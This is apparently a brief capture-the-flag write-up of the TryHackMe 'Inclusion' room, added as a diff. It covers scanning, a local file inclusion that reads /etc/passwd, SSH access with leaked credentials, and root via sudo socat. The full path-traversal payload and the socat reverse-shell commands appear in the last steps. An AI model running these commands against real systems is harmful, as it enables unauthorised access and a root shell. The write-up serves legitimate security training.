@@ -1,0 +1,11 @@
+This is a VERY brief writeup on the Inclusion box found at https://tryhackme.com/room/inclusion
+I began with running 'nmap -A -sV -O -Pn -p- -vvv -T4 --min-parallelism 100 <IPv4 Address>'
+This resulted in showing port 22 and port 80 open.
+Navigating to http://<IPv4 Address> resulted in a web page with some information on Local and remote file inclusion attacks. Due to this room being about beginner LFIs, I checked out the details on the LFI section of the blog.
+This takes you to the url http://<IPv4 Address>/article?name=lfiattack
+Having some basic experience in what LFI attacks look like, I saw that ?name=lfiattack was most likely pointing to a file named lfiattack.
+Changing this to ?name=../../../../etc.passwd then sending that request resulted in the content of /etc/passwd. At this point it's obvious that the page is vulnerable to local file inclusion. Looking briefly through the /etc/passwd file for some information about the users, I saw the comment #<USERNAME_REDACTED>:<PASSWORD_REDACTED>.
+Attempting to ssh <USERNAME_REDACTED>@<IPv4 Address> with the password succeeded in getting user access.
+From this point on, I ran 'sudo -l' which showed that <USERNAME_REDACTED> could run /usr/bin/socat as root with no password required. I then checked out GTFOBins on socat and confirmed a reverse shell was possible.
+On my machine, I ran 'socat file:`tty`,raw,echo=0 tcp-listen:12345' then on the LFI machine, I ran 'RHOST=<my IPv4 Address>' and 'RPORT=12345'.
+Finally, I ran 'sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane' which connected to my listening shell. Running 'id' showed that I was root which allowed me to 'cd /root', 'ls -lA', then 'cat root.txt'.
